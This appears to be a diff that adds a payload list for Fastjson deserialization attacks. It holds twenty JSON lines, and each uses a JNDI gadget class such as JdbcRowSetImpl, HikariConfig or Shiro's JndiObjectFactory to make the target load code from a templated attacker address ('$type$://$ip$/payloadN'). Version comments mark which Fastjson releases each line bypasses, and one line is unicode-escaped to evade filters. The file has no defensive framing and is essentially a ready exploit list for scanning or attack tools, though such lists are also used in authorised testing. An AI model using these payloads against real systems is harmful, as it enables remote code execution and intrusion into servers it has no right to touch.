@@ -1,0 +1,20 @@
+{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$type$://$ip$/payload1","autoCommit":true}} #Fastjson <=1.2.24
+{"b":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"$type$://$ip$/payload2","autoCommit":true}} #Fastjson <=1.2.24
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"$type$://$ip$/payload3","autoCommit":true} #Fastjson<=1.2.41
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"$type$://$ip$/payload4","autoCommit":true} #Fastjson<=1.2.42
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"$type$://$ip$/payload5","autoCommit":true} #Fastjson<=1.2.43
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"$type$://$ip$/payload6"}} #Fastjson<=1.2.45
+{"a":{"@type": "java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$type$://$ip$/payload7","autoCommit":true}} #Fastjson<=1.2.47
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"$type$://$ip$/payload8"} #Fastjson<=1.2.62,CVE-2020-8840
+{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"$type$://$ip$/payload9"} #Fastjson<=1.2.66
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"$type$://$ip$/payload10"} #Fastjson<=1.2.66
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"$type$://$ip$/payload11"}} #Fastjson<=1.2.66
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"$type$://$ip$/payload12"} #Fastjson<=1.2.67
+{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["$type$://$ip$/payload13"],"Realms":[""]} #Fastjson<=1.2.67
+{"@type":"com.caucho.config.types.ResourceRef","lookupName":"$type$://$ip$/payload14"} #Fastjson<=1.2.67
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties":{"@type":"java.util.Properties","UserTransaction":"$type$://$ip$/payload15"}} #Fastjson<=1.2.67
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"$type$://$ip$/payload16"} #Fastjson<=1.2.68
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"$type$://$ip$/payload17"} #Fastjson<=1.2.68
+{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"$type://$ip$/payload18"} #未知
+{"@type":"org.apache.openjpa.ee.RegistryManagedRuntime","registryName":"$type$://$ip$/payload19","rollbackOnly":null} #未知
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"$type$://$ip$/payload20"} #未知
